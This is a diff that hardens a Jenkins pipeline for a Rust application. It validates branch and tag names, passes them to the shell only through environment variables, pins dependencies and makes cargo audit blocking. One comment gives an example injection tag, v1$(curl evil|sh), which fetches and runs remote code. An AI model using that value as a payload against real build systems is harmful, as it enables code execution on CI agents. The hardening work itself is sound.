@@ -2,11 +2,24 @@
 // Armature Application - Jenkins Multibranch Pipeline
 // =============================================================================
 // Full CI/CD pipeline with environment-specific deployments
+//
+// Security notes:
+// - Branch and tag names are chosen by whoever can push to the repository
+//   (or open a PR), so they are untrusted input. They are validated against
+//   a strict pattern and only ever reach the shell as environment variables
+//   (withEnv) inside single-quoted sh '...' steps. Never interpolate them
+//   into a Groovy string ("${...}") that becomes a shell command: a tag like
+//   v1$(curl evil|sh) would run on the agent.
+// - `cargo audit` failures fail the build.
 // =============================================================================
 
-def APP_NAME = env.JOB_BASE_NAME ?: 'armature-app'
+// Fixed names; not derived from the (attacker-influenced) job/branch name.
+def APP_NAME = 'armature-app'
 def DOCKER_REGISTRY = 'your-registry.com'
-def HELM_RELEASE = APP_NAME
+
+// Allowed shapes for refs that end up in image tags / release names.
+def SAFE_BRANCH = ~/^[A-Za-z0-9][A-Za-z0-9._\/-]{0,99}$/
+def SAFE_TAG = ~/^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$/
 
 pipeline {
     agent any
@@ -14,6 +27,12 @@ pipeline {
     environment {
         RUST_BACKTRACE = '1'
         CARGO_TERM_COLOR = 'always'
+        APP_NAME = "${APP_NAME}"
+        DOCKER_REGISTRY = "${DOCKER_REGISTRY}"
+        // Per-job cargo cache: never shared with other jobs/branches, so one
+        // pipeline cannot plant artifacts that another one then executes.
+        CARGO_HOME = "${env.WORKSPACE}/.cargo-home"
+        CARGO_TARGET_DIR = "${env.WORKSPACE}/target"
     }
 
     options {
@@ -31,8 +50,15 @@ pipeline {
             steps {
                 checkout scm
                 script {
+                    if (env.TAG_NAME && !(env.TAG_NAME ==~ SAFE_TAG)) {
+                        error("Refusing to build: tag name does not match ${SAFE_TAG}")
+                    }
+                    if (env.BRANCH_NAME && !(env.BRANCH_NAME ==~ SAFE_BRANCH)) {
+                        error("Refusing to build: branch name does not match ${SAFE_BRANCH}")
+                    }
                     env.GIT_COMMIT_SHORT = sh(script: 'git rev-parse --short HEAD', returnStdout: true).trim()
-                    env.GIT_BRANCH_CLEAN = env.BRANCH_NAME.replaceAll('/', '-')
+                    // Docker tags allow [A-Za-z0-9_.-]; map anything else to '-'.
+                    env.GIT_BRANCH_CLEAN = (env.BRANCH_NAME ?: 'detached').replaceAll(/[^A-Za-z0-9_.-]/, '-')
                 }
             }
         }
@@ -43,8 +69,8 @@ pipeline {
         stage('Build') {
             steps {
                 sh '''
-                    echo "🔨 Building ${APP_NAME}..."
-                    cargo build --release
+                    echo "Building ${APP_NAME}..."
+                    cargo build --release --locked
                 '''
             }
         }
@@ -56,7 +82,7 @@ pipeline {
             parallel {
                 stage('Unit Tests') {
                     steps {
-                        sh 'cargo test --lib --release -- --test-threads=4'
+                        sh 'cargo test --lib --release --locked -- --test-threads=4'
                     }
                     post {
                         always {
@@ -73,7 +99,7 @@ pipeline {
                         }
                     }
                     steps {
-                        sh 'cargo test --test "*" --release || true'
+                        sh 'cargo test --test "*" --release --locked'
                     }
                 }
             }
@@ -91,12 +117,19 @@ pipeline {
                 }
                 stage('Clippy') {
                     steps {
-                        sh 'cargo clippy --all-targets --release -- -D warnings'
+                        sh 'cargo clippy --all-targets --release --locked -- -D warnings'
                     }
                 }
                 stage('Security') {
                     steps {
-                        sh 'cargo audit || true'
+                        // Blocking: a known-vulnerable dependency fails the
+                        // build. Record a justified exception in
+                        // .cargo/audit.toml rather than ignoring the result.
+                        sh '''
+                            command -v cargo-audit >/dev/null 2>&1 \
+                                || cargo install cargo-audit --version 0.22.2 --locked
+                            cargo audit
+                        '''
                     }
                 }
             }
@@ -115,15 +148,14 @@ pipeline {
             }
             steps {
                 script {
-                    def imageTag = env.TAG_NAME ?: "${env.GIT_BRANCH_CLEAN}-${env.GIT_COMMIT_SHORT}"
-
-                    sh """
-                        echo "🐳 Building Docker image..."
-                        docker build -t ${DOCKER_REGISTRY}/${APP_NAME}:${imageTag} .
-                        docker tag ${DOCKER_REGISTRY}/${APP_NAME}:${imageTag} ${DOCKER_REGISTRY}/${APP_NAME}:${env.GIT_BRANCH_CLEAN}-latest
-                    """
-
-                    env.DOCKER_TAG = imageTag
+                    env.DOCKER_TAG = env.TAG_NAME ?: "${env.GIT_BRANCH_CLEAN}-${env.GIT_COMMIT_SHORT}"
+                }
+                withEnv(["IMAGE_TAG=${env.DOCKER_TAG}", "BRANCH_TAG=${env.GIT_BRANCH_CLEAN}-latest"]) {
+                    sh '''
+                        echo "Building Docker image..."
+                        docker build -t "${DOCKER_REGISTRY}/${APP_NAME}:${IMAGE_TAG}" .
+                        docker tag "${DOCKER_REGISTRY}/${APP_NAME}:${IMAGE_TAG}" "${DOCKER_REGISTRY}/${APP_NAME}:${BRANCH_TAG}"
+                    '''
                 }
             }
         }
@@ -136,16 +168,20 @@ pipeline {
                 branch 'develop'
             }
             steps {
-                echo "🚀 Deploying to development..."
-                sh """
-                    # Example: Helm deployment
-                    # helm upgrade --install ${HELM_RELEASE}-dev ./templates/helm/armature \\
-                    #     --namespace development \\
-                    #     --set image.tag=${env.DOCKER_TAG} \\
-                    #     --set environment=development
+                echo 'Deploying to development...'
+                withEnv(["IMAGE_TAG=${env.DOCKER_TAG}"]) {
+                    sh '''
+                        # Example: Helm deployment (the chart requires an image
+                        # and a JWT secret; reference a pre-created Secret)
+                        # helm upgrade --install "${APP_NAME}-dev" ./templates/helm/armature \
+                        #     --namespace development \
+                        #     --set image.repository="${DOCKER_REGISTRY}/${APP_NAME}" \
+                        #     --set image.tag="${IMAGE_TAG}" \
+                        #     --set secrets.existingSecret="${APP_NAME}-secrets"
 
-                    echo "Deployed ${APP_NAME}:${env.DOCKER_TAG} to development"
-                """
+                        echo "Deployed ${APP_NAME}:${IMAGE_TAG} to development"
+                    '''
+                }
             }
         }
 
@@ -157,16 +193,19 @@ pipeline {
                 branch 'main'
             }
             steps {
-                echo "🚀 Deploying to staging..."
-                sh """
-                    # Example: Helm deployment
-                    # helm upgrade --install ${HELM_RELEASE}-staging ./templates/helm/armature \\
-                    #     --namespace staging \\
-                    #     --set image.tag=${env.DOCKER_TAG} \\
-                    #     --set environment=staging
+                echo 'Deploying to staging...'
+                withEnv(["IMAGE_TAG=${env.DOCKER_TAG}"]) {
+                    sh '''
+                        # Example: Helm deployment
+                        # helm upgrade --install "${APP_NAME}-staging" ./templates/helm/armature \
+                        #     --namespace staging \
+                        #     --set image.repository="${DOCKER_REGISTRY}/${APP_NAME}" \
+                        #     --set image.tag="${IMAGE_TAG}" \
+                        #     --set secrets.existingSecret="${APP_NAME}-secrets"
 
-                    echo "Deployed ${APP_NAME}:${env.DOCKER_TAG} to staging"
-                """
+                        echo "Deployed ${APP_NAME}:${IMAGE_TAG} to staging"
+                    '''
+                }
             }
         }
 
@@ -181,17 +220,20 @@ pipeline {
                 timeout(time: 30, unit: 'MINUTES') {
                     input message: 'Deploy to production?', ok: 'Deploy'
                 }
-                echo "🚀 Deploying to production..."
-                sh """
-                    # Example: Helm deployment
-                    # helm upgrade --install ${HELM_RELEASE} ./templates/helm/armature \\
-                    #     --namespace production \\
-                    #     --set image.tag=${env.TAG_NAME} \\
-                    #     --set environment=production \\
-                    #     --set replicaCount=3
+                echo 'Deploying to production...'
+                withEnv(["RELEASE_TAG=${env.TAG_NAME}"]) {
+                    sh '''
+                        # Example: Helm deployment
+                        # helm upgrade --install "${APP_NAME}" ./templates/helm/armature \
+                        #     --namespace production \
+                        #     --set image.repository="${DOCKER_REGISTRY}/${APP_NAME}" \
+                        #     --set image.tag="${RELEASE_TAG}" \
+                        #     --set secrets.existingSecret="${APP_NAME}-secrets" \
+                        #     --set replicaCount=3
 
-                    echo "Deployed ${APP_NAME}:${env.TAG_NAME} to production"
-                """
+                        echo "Deployed ${APP_NAME}:${RELEASE_TAG} to production"
+                    '''
+                }
             }
         }
     }
@@ -201,13 +243,12 @@ pipeline {
             cleanWs()
         }
         success {
-            echo "✅ Pipeline succeeded for ${APP_NAME}"
-            // slackSend(color: 'good', message: "✅ ${APP_NAME} build #${BUILD_NUMBER} succeeded")
+            echo "Pipeline succeeded for ${APP_NAME}"
+            // slackSend(color: 'good', message: "${APP_NAME} build #${BUILD_NUMBER} succeeded")
         }
         failure {
-            echo "❌ Pipeline failed for ${APP_NAME}"
-            // slackSend(color: 'danger', message: "❌ ${APP_NAME} build #${BUILD_NUMBER} failed")
+            echo "Pipeline failed for ${APP_NAME}"
+            // slackSend(color: 'danger', message: "${APP_NAME} build #${BUILD_NUMBER} failed")
         }
     }
 }
-
